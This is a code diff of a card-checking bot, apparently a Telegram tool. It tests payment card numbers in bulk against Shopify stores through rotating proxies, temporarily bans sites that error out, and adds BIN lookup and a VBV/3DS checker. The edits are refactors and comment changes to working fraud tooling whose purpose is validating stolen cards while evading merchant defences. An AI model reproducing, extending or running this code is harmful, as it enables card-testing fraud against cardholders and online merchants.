@@ -6,7 +6,7 @@
 # - /cleanrz removes sites that return server errors
 # - All mass and single callbacks included
 # - VBV/3DS checker returns detailed dict and formatting function
-# - Added handle_clean_my_proxies to fix NameError
+# - handle_clean_my_proxies defined and returned
 
 import asyncio
 import requests, time, threading, random, logging, re, csv, os, urllib3, traceback, json, base64, html, hashlib
@@ -654,12 +654,10 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                     api_resp = check_shopify_api(site_url, cc, proxy)
                     response_text, raw_status, gateway_result = process_shopify_api_response(api_resp, price)
                     last_response = response_text
-                    resp_upper = (response_text or "").upper()
 
-                    # 1. Check if this is a real gateway response using our decision block
+                    # Use the fixed categorize_response to decide
                     final_status = categorize_response(response_text)
 
-                    # If we got a real gateway response (not ERROR), return it
                     if final_status != 'ERROR':
                         bin_info = get_bin_info(cc.split('|')[0])
                         return {
@@ -676,25 +674,22 @@ def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                             'timestamp': datetime.now().isoformat()
                         }, False
 
-                    # 2. If it's ERROR, check if it's a site-level error (like CAPTCHA, proxy error)
-                    # We treat any non-gateway response as a site error – retry with next site/proxy
+                    # ERROR → remove this proxy, ban site temporarily, then try next site
                     if proxy in available_proxies:
                         available_proxies.remove(proxy)
-                    # Optionally ban the site temporarily
                     with sites_lock:
                         temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
-                    break  # break out of proxy loop, will pick next site
+                    break  # break inner proxy loop, pick next site in outer loop
 
                 except Exception as e:
                     if proxy in available_proxies:
                         available_proxies.remove(proxy)
                     continue
 
-            # If we exhausted proxies, try next site with fresh proxy list
-            # (we already added site to temp ban, so it will skip it for a while)
-            continue  # will pick next site
+            # All proxies for this site exhausted; site already temp-banned, will try another site
+            continue
 
-        # If all sites failed
+        # All sites/proxies exhausted
         return error_result(cc, "All sites/proxies exhausted"), False
 
     processed = 0
@@ -1330,7 +1325,6 @@ def vbv_checker(ccx):
         if "network" in api_data:
             result["network"] = api_data["network"]
         else:
-            # Infer network from card prefix
             first = cc[0]
             if first == "4":
                 result["network"] = "Visa (VBV)"
